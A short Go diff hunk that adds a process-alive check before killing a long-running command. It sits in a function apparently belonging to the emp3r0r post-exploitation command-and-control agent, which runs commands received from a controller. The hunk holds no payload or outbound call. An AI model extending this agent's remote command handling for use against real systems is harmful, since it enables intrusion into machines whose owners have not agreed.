@@ -276,7 +276,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 				for i := 0; i < 10; i++ {
 					time.Sleep(time.Second)
 				}
-				if !keep_running {
+				if !keep_running && util.IsPIDAlive(cmd.Process.Pid) {
 					err = cmd.Process.Kill()
 					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
 						cmd.Process.Pid, err)
